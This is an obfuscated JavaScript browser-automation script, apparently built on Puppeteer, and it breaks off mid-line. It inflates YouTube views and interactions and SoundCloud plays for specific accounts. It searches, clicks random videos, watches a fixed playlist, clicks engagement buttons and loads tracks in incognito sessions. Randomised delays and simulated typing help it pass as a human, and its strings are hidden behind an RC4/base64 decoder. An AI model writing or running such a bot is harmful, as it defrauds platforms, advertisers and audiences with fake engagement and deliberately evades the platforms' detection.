const a0 = b,
  Z = d,
  Y = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x11e5 + 0x17e8 + -0x602 * 0x1))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x2506 + -0x14b1 * -0x1 + 0x1055), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0xb61c + -0x16 * 0x4fa + -0x5c * -0x7c + (0x16f7 + 0xa48 + 0x1959) * random()) : await standardWaitForNetIdle(f), await wait(0x14ff + -0x23b * 0x9 + 0x31a * 0x6 + (0x2bd3 + 0x1d87 + -0x85 * 0x42) * random()), 0x724 + -0x1 * 0x26b + -0x4b8;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x26d1 + 0xfb4 + 0x1 * -0x22fd), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1 * 0x147d + -0x1 * -0x2077 + 0x5 * -0x265;
}
async function randomWait() {
  return await wait(-0x7a6 + 0x1c91 * 0x1 + -0x47 * 0x5 + (-0x16df + -0x5 * 0x7f + -0x3 * -0xef6) * random()), 0x242d + 0x189b + -0x3cc7;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1a5d + 0xabe + 0xf9f);
    let h = e[f];
    if (b['XvTpqr'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x90c + -0x9c7 * 0x1 + 0xbb, s, t, u = 0x2438 + -0x1b92 + -0x52 * 0x1b; t = n['charAt'](u++); ~t && (s = r % (-0x4a9 * -0x3 + -0x11e5 + -0x3ee * -0x1) ? s * (-0x2506 + -0x14b1 * -0x1 + 0x1095) + t : t, r++ % (0x1e5a + -0x4 * 0x490 + -0x22 * 0x5b)) ? p += String['fromCharCode'](0x7a8 + 0x36d + -0xa16 & s >> (-(0x14ff + -0x23b * 0x9 + 0x1a * -0x9) * r & 0x15ea + 0xec4 + -0x88 * 0x45)) : 0x724 + -0x1 * 0x26b + -0x4b9) {
          t = o['indexOf'](t);
        }
        for (let v = 0x26d1 + 0xfb4 + 0x1 * -0x3685, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1 * 0x147d + -0x1 * -0x2077 + 0x19 * -0x7a))['slice'](-(-0x7a6 + 0x1c91 * 0x1 + -0x65 * 0x35));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x16df + -0x5 * 0x7f + -0x5 * -0x512,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x242d + 0x189b + -0x3cc8; u < 0x3bc * 0x3 + -0xc27 + 0x1 * 0x1f3; u++) {
          p[u] = u;
        }
        for (u = 0x70 + 0x2 * -0x163 + 0x256; u < 0x1604 + -0x1f5 + -0x130f; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1dbf + 0x1 * -0xf4d + 0x1 * -0xd72), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1fb5 + -0x14f * 0x1b + -0x430a * -0x1, q = -0x1958 + -0x262b + 0x3f83;
        for (let v = -0x2603 + 0xb45 + -0x146 * -0x15; v < n['length']; v++) {
          u = (u + (0xb84 + 0x1ee9 + -0x2a6c)) % (-0x5bd + 0x1232 * 0x2 + -0x1 * 0x1da7), q = (q + p[u]) % (0xd3f * -0x2 + -0x187 * 0x5 + 0x11 * 0x211), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1 * 0x23cb + 0x10 * -0xf2 + 0x33eb)]);
        }
        return t;
      };
      b['VjXquA'] = m, c = arguments, b['XvTpqr'] = !![];
    }
    const j = e[0x9cc + 0x5 * -0x709 + -0x1 * -0x1961],
      k = f + j,
      l = c[k];
    return !l ? (b['szdwpM'] === undefined && (b['szdwpM'] = !![]), h = b['VjXquA'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function a() {
  const bq = [
    '-agar-io-s',
    'WRe6WRxcGqGtCCokufO',
    'zwfZEwzVCMSUBW',
    'r\x20beast,mr',
    'u8E3p0Vy-P',
    'Ox7Ng5T7bm',
    '\x20NT\x2010.0;\x20',
    'BhLTzxiTzgLZyq',
    'pts/430253',
    'zY1HntLMzgnImq',
    'W4BcGmoQWP7cOMj7W7NcPa',
    'Ahr0Chm6lY9NCG',
    'https://gr',
    'W47cM8oEWPLXWP4',
    'BNGYltrSnhm0tG',
    'ocumentEle',
    'W5tcJSoeWO1TW4NdTHKrWRu',
    'free-ai-to',
    'jMC/DZpdG8o5vsP3',
    'Aw5KzxGUANmGyW',
    'qCogW50HW4uwW4NdHapcPa',
    'finalize',
    'wtuZq21TCgjpsG',
    'CMCVC2nYAxb0CW',
    'vJnoEhHWvvvMvW',
    'ave-separa',
    'u2fMyxjPlZuZnW',
    'AL9Ustzhm1PeAq',
    'WRldMSkVhCk3WRFcKSkEdXi',
    'W4NcKWFdHSkoiSodsuuE',
    'random',
    'y2HPBgroB2rLCW',
    'CMjLyxn0ihn1BG'
  ];
  a = function() {
    return bq;
  };
  return a();
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = d;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x3bc * 0x3 + -0xc27 + 0x1 * 0xf3, 0x70 + 0x2 * -0x163 + 0x25d), i[Math['floor'](Math[R(0x1e)]() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x10832 + -0x1776 + -0x65c) * getRandomInt(0x1dbf + 0x1 * -0xf4d + 0x7 * -0x210, -0x1fb5 + -0x14f * 0x1b + -0x430f * -0x1), h)), -0x1958 + -0x262b + 0x3f84;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1a5d + 0xabe + 0xf9f);
    let h = e[f];
    if (c['vKjgzb'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x90c + -0x9c7 * 0x1 + 0xbb, r, s, t = 0x2438 + -0x1b92 + -0x52 * 0x1b; s = m['charAt'](t++); ~s && (r = q % (-0x4a9 * -0x3 + -0x11e5 + -0x3ee * -0x1) ? r * (-0x2506 + -0x14b1 * -0x1 + 0x1095) + s : s, q++ % (0x1e5a + -0x4 * 0x490 + -0x22 * 0x5b)) ? o += String['fromCharCode'](0x7a8 + 0x36d + -0xa16 & r >> (-(0x14ff + -0x23b * 0x9 + 0x1a * -0x9) * q & 0x15ea + 0xec4 + -0x88 * 0x45)) : 0x724 + -0x1 * 0x26b + -0x4b9) {
          s = n['indexOf'](s);
        }
        for (let u = 0x26d1 + 0xfb4 + 0x1 * -0x3685, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1 * 0x147d + -0x1 * -0x2077 + 0x19 * -0x7a))['slice'](-(-0x7a6 + 0x1c91 * 0x1 + -0x65 * 0x35));
        }
        return decodeURIComponent(p);
      };
      c['hQeUIa'] = i, b = arguments, c['vKjgzb'] = !![];
    }
    const j = e[-0x16df + -0x5 * 0x7f + -0x5 * -0x512],
      k = f + j,
      l = b[k];
    return !l ? (h = c['hQeUIa'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x2603 + 0xb45 + -0x146 * -0x15;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0xb84 + 0x1ee9 + -0x2a6c]['split']('\x20');
    for (let k = -0x5bd + 0x1232 * 0x2 + -0x3b * 0x85; k < i['length']; k += 0xd3f * -0x2 + -0x187 * 0x5 + 0x3 * 0xb61)
      j += i[k] * h[i[k + (-0x1 * 0x23cb + 0x10 * -0xf2 + 0x32ec)]];
    return j;
  });
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1a5d + 0xabe + 0xf9f);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const S = c,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x9cc + 0x5 * -0x709 + -0x1 * -0x1967)['map'](l => Array['from'](l['children']))['flat'](-0x69a + -0x45d * -0x6 + -0x1393 * 0x1)['map'](l => l['childNodes'][-0xc58 + -0x1e45 + 0x5 * 0x886][S(0x1f)][-0x6a4 + -0x19c9 + 0x206d]['childNodes'][0x3 * 0xb2d + 0x7 * 0xef + 0x280f * -0x1]['childNodes'][0x13 * 0x16e + -0x3fe * -0x8 + 0x59 * -0xaa]['childNodes'][-0x223d + 0x5 * 0x18d + 0x1a7d]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x2 * -0x14d + -0x3d * -0x4 + 0x5a, 0x1ac9 + -0x1a23 + 0x12e2)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x47 * 0x143 + 0x120e * 0x5 + -0x7943);
  const h = await getMaxTime(f),
    i = Math['min']((-0xe83c + 0xc514 * 0x1 + 0x1 * 0x10d88) * getRandomInt(-0x16a7 + -0x376 * 0xb + 0x3cbb, -0x1906 + -0x1888 + -0x715 * -0x7), h);
  return await wait(i), 0x3 * 0x827 + -0x16c * -0x1a + 0x1eb6 * -0x2;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const T = b;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math[T(0xd, 'R@aj')]() * h['length'])])['children'][0x24e + 0x145b + -0x16a9 * 0x1]['children'][-0x2 * 0x87b + -0x1 * 0x1f55 + 0x304b]['children'][0x3 * -0xa93 + 0x137e + -0x1 * -0xc3b]['children'][-0x16de + -0x1d49 + 0x3427 * 0x1]['children'][-0x1150 + -0x909 * 0x1 + 0x1a59]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x194f + -0x233 * 0x5 + 0x244f;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x146a + 0xaaf + 0x463 * -0x7 + (-0x112d * 0x1 + -0xfc5 + 0x2124) * random()
  }), await wait(0x101 * 0x4 + -0x245f + 0x1 * 0x224f + (0xd * 0x15 + 0xd * 0x1fd + -0x19be) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x3d8 + 0x1e45 + 0x1 * -0x1a6b]['childNodes'][0x92 * 0x1d + 0x7 * -0x55a + 0x14ed]['childNodes'][-0x1374 + 0xd41 + -0x1 * -0x634]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x24c1 * -0x1 + 0xe * 0x29 + 0x5 * 0x6e8]['childNodes'][0x5c1 + -0x6df * -0x1 + -0xca0 * 0x1]['childNodes'][0x92b * 0x4 + -0xdd2 + -0x16d8]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0xda9 * 0x1 + 0xe6 + -0x747 * 0x2),
          r = -0x1355 + -0x1 * 0x359 + 0x1 * 0x16ae;
        for (let u = 0x1db2 + 0x1e * 0x1 + 0x1 * -0x1dd0; u < q['length']; u += -0x10a5 + -0x1c24 * 0x1 + 0x2ccb)
          r += q[u] * k[q[u + (-0x25d9 * -0x1 + -0x45d + -0x217b)]];
        return r;
      }(n);
  });
  await wait((0x2f6 + -0xe * 0x4c1 + -0x5c * -0x154) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x115 * 0xbf + -0x9 * 0x2ed3 + 0x2 * 0xe090) * getRandomInt(-0x4 * -0xba + -0x1a57 + 0x1770, 0x10e9 + 0x5db + -0x16ba), h + (-0x1 * -0x1b2f + 0x1326 + -0x1acd));
  return await wait(i), -0xfc2 * 0x1 + -0xa2d + -0x298 * -0xa;
}
async function keyWatch(f) {
  const U = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x20b6 + -0xc9e + -0x1418), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + U(0x1, '8k*n') + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x1a58 + -0x1adf + 0x40ef + (-0x27e * 0xc + 0x22f7 * -0x1 + 0x44c7) * Math['random']());
    });
  }, 0x32c9 + 0x1 * 0x2603 + -0x3d74);
  await wait(0x1d87b + 0x3cd67 + -0x5b56 * 0x3);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x9 * 0x1926 + 0x1430b * 0x1 + -0x13b01 * 0x1) * getRandomInt(-0xf9f + -0xf5a + 0x1efd, 0x10 * -0x17b + 0x1 * 0x12f2 + 0x4d7 * 0x1)), clearInterval(h), -0x209e + 0x719 + -0x21 * -0xc6;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1fa0 + 0xfde + 0xfc2;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0xb9b + -0x11 * 0x17 + 0x39 * 0x3b;
    await randomWait();
  }
  return -0x22bd + 0xb7d + 0x1741;
}

function fetchRandomSC() {
  const V = b;
  return Math['random']() <= 0x11f * -0x9 + 0x1fac + -0x1595 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x1da * 0x11 + -0xb05 + 0x2a7f + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + V(0x1c, '0$K5') + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x19ce + -0x773 + 0x2141 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x1 * -0x124a + -0x6a2 + -0x2 * 0x5d4;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x60a + -0x1 * 0x12fa1 + 0x1e573 + getRandomInt(0x6b * -0x61 + -0x3258 + -0x1 * -0x957b, 0x403b + 0x7e * -0xbc + -0xf * -0x9b3));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x556 * -0x2 + -0xb * -0x3d + -0xd4a), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x3 * 0xabd + -0xbc1 * -0x3 + -0x30c;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x1546 + 0xdf0 + -0x139 * -0x6, -0x2508 + 0x2 * -0x4a + 0x25ce)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x1fa4 + -0x1c21 + 0x1 * 0x4395 + floor((0x13d8 + 0x214d + -0x5 * 0x9d9) * random()))), log('p2'), log(await s['evaluate'](() => {
        const W = d;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xa1cf77fe + 0x4d9bf9dc + -0xb2b2196 * -0x13),
          -0x8cd748 + -0xc0f6c6 + 0x3 * 0x99ef5a,
          0xf055 + 0xb * 0x47f + -0x36 * 0x2ff,
          -0x5 * -0x467 + 0x525 * -0x2 + -0xb39
        ], y = [
          0x1d80 + 0x1 * 0x1724 + 0x2c4 * -0x13,
          -0x1 * 0x1150 + -0x1d19 + 0x2e79,
          -0xa34 * -0x2 + 0x4 * -0x40d + -0x42c,
          0x2138 + -0x222d * 0x1 + 0xf5
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x30 * -0x9e + 0x1082 + 0x697 * -0x7)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x3 * -0x876 + 0xfda + 0x988; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x20f1 + 0x1867 * -0x1 + -0x5bc * -0xa) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x2521 * 0x1 + -0x8f * -0x31 + 0x9c2] = A[0x34b * 0xb + 0xeeb + 0x1c * -0x1d3] = A[0x8 * -0x44a + -0x1 * -0x12df + 0xf72] = A[0x19 * 0x170 + 0x99 * 0x14 + -0x2fe2] = A[0x1 * -0xb64 + -0x1f6c + -0x241 * -0x13] = A[-0x1279 * -0x1 + -0x1f86 + -0x45b * -0x3] = A[0x24d3 + 0x1fec + -0x1cf * 0x26] = A[-0x878 + 0x13c4 + 0x27 * -0x4a] = A[-0x1e * 0xce + 0x1469 + 0x4a * 0xd] = A[0xd70 + 0x9 * -0x27b + 0x8eb] = A[-0x2 * 0x32f + -0x116d + 0x17d4] = A[0x71 + 0xf1b + -0xf82] = A[0xdd0 + 0x1a05 * -0x1 + 0x188 * 0x8] = A[-0x14df + -0x20c2 + 0x35ad] = A[0x4 * -0x274 + 0x4cd * -0x1 + 0xeaa * 0x1] = A[-0x1104 + -0x233f + 0x3451] = A[0xc54 + -0x13f + 0xb06 * -0x1] = 0x1 * -0x24fc + -0xaa9 + 0x1 * 0x2fa5, this['blocks'] = A) : this['blocks'] = [
                -0x5 * 0x2b3 + 0x18a0 + -0xb21,
                0x5f * -0x65 + -0x23af + 0xa * 0x751,
                0x1020 + -0x2524 + 0x1504,
                0x35 * 0x14 + -0x238d + -0x1 * -0x1f69,
                -0x1 * 0x14e7 + 0x1b05 + -0x57 * 0x12,
                -0xaba + -0x4df * -0x7 + 0x175f * -0x1,
                0x5 * 0x745 + 0x3 * 0x541 + -0x341c,
                0xed8 + -0x35 * 0x3b + 0x2a1 * -0x1,
                -0x1 * -0x1a7d + -0x1f1b + 0x49e,
                0x7 * -0x1c4 + 0xf84 + -0x65 * 0x8,
                0x1 * -0x1e91 + 0x25c2 + 0x7 * -0x107,
                -0x3 * 0x6ad + 0x687 + 0xd80,
                0x1 * 0x2441 + 0xa * 0x344 + -0x44e9,
                0x157e + -0xd1c * -0x1 + 0x67 * -0x56,
                0x1df3 + -0xc * -0x155 + -0x2def,
                -0x26 * -0x53 + 0x4 * -0x9d + -0x3 * 0x34a,
                -0x191a + -0xbb * -0x11 + -0x1 * -0xcaf
              ], this['h0'] = -0x151bdf9f * 0x2 + -0xa48096ea + 0x1 * 0x135fd7929, this['h1'] = 0x43 * -0x2bb4be6 + 0x4126cd32 * 0x7 + -0x213d13a3, this['h2'] = 0x39e7264f * -0x5 + 0x3 * 0x2d4d8f9 + 0x3b * 0x75a08fa, this['h3'] = 0x2c9512e + -0xc4f * 0x24203 + -0x9dd7 * -0x42d3, this['h4'] = -0x59 * 0x22e41ef + -0x184a44e91 + 0x30a8c1c98, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x114b + 0x23bc + -0x1271, this['finalized'] = this['hashed'] = -0x57a + 0x23 * -0x109 + 0xde7 * 0x3, this['first'] = 0x1 * -0x74b + -0x14fe + 0x1c4a;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1 * 0x94 + -0x1b22 * 0x1 + 0x1a8e, O = J['length'] || -0x1c9 * 0x8 + -0xd6d + 0x1bb5, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0xf0c * 0x1 + 0x57f * 0x2 + -0x1a0a, P[-0x1442 + 0x6f5 * -0x1 + -0x1b37 * -0x1] = this['block'], P[0x1c48 + -0x2 * -0xe3e + -0x38b4] = P[0x1fba + -0x2267 * 0x1 + 0x7 * 0x62] = P[-0xda + 0x1bed + -0x29 * 0xa9] = P[0x1b1 * -0x6 + 0x2 * -0x125b + -0x1 * -0x2edf] = P[-0x1 * 0xb89 + -0x1c24 * -0x1 + -0x1097] = P[-0x12ef + -0x2ba * -0x3 + 0xac6] = P[0xd * 0x275 + 0xb62 + -0x8a9 * 0x5] = P[-0x19 * 0xe5 + 0x53c + 0x1 * 0x1128] = P[0x2e * 0x95 + -0x1c67 + 0x55 * 0x5] = P[-0x111 * 0x9 + -0x4 * -0x643 + 0x2 * -0x7b5] = P[0x2538 + 0x12a0 + 0x129a * -0x3] = P[-0x665 * 0x1 + 0x1fe0 + -0x1970] = P[0x937 + -0x21 * -0xa1 + -0xef6 * 0x2] = P[0x1af * -0x9 + 0x4b * 0x2a + 0x2e6] = P[0x2219 + -0x1d30 + -0x4db] = P[0x1522 + 0x1004 + -0x2517] = -0x3 * -0x1c6 + 0x1 * 0xb74 + -0x10c6), K) {
                    for (N = this['start']; M < O && N < -0x5 * 0x7cf + 0xc8 * 0x29 + 0x743; ++M)
                      P[N >> -0x1102 + -0x244 * -0x2 + 0xc7c] |= J[M] << y[-0xa5e + -0xe17 + -0x24 * -0xae & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x1 * -0x1d71 + 0x279 * 0x2 + -0x2223; ++M)
                      (L = J['charCodeAt'](M)) < -0x1d53 * -0x1 + -0x2591 + 0x45f * 0x2 ? P[N >> 0xdb0 + -0x4eb * 0x5 + 0xae9] |= L << y[0x2585 + -0x5 * -0x536 + -0x24 * 0x1c4 & N++] : L < 0x1 * 0x17b9 + 0x167 + -0x448 * 0x4 ? (P[N >> -0x15f3 + 0x77f * -0x4 + 0x33f1] |= (0x23ab + -0xfa7 + -0x1344 | L >> -0x1f0 + -0x295 * 0x9 + 0x1933) << y[-0x3e * -0x11 + 0x5 * -0x202 + -0x31 * -0x1f & N++], P[N >> -0x60 * -0x27 + -0x6bd + 0x1 * -0x7e1] |= (0x305 * 0x1 + 0x25ba + -0x283f * 0x1 | 0x157c + -0x4f * -0x6c + -0x3691 & L) << y[-0x9a6 + -0xfa0 + 0x1 * 0x1949 & N++]) : L < 0xe9e1 + -0x222a + 0x1049 || L >= 0xadf9 + -0x2a6a + -0x1 * -0x5c71 ? (P[N >> 0x24b + -0xc01 + -0x26e * -0x4] |= (0xb * -0xc1 + -0x2185 + -0x1558 * -0x2 | L >> 0x1 * 0x1bdd + 0x1 * 0x91f + -0x24f0) << y[-0x22bd + -0x19c1 + 0x9 * 0x6b9 & N++], P[N >> -0x4a2 + -0x1c1a + 0x20be] |= (-0x639 + -0x14bc + -0x30d * -0x9 | L >> -0x3 * -0x135 + -0x18cd * 0x1 + -0x76 * -0x2e & 0x419 * -0x1 + 0x4a7 * 0x7 + -0x121 * 0x19) << y[0x4e1 * -0x5 + 0xb28 + 0xd40 & N++], P[N >> 0x30 * -0x35 + 0x21f3 + -0x1801 * 0x1] |= (0x1404 + 0x1 * -0xe5 + -0x129f | 0x2297 + -0x1ed5 + 0x1 * -0x383 & L) << y[-0x2293 * 0x1 + -0xa2 * -0x7 + 0x1e28 & N++]) : (L = 0xf * 0x1591 + -0x958f + 0x5210 + ((0x14c1 * -0x1 + 0x198a * 0x1 + 0x1 * -0xca & L) << -0xadd + 0x297 * 0xf + -0x92 * 0x31 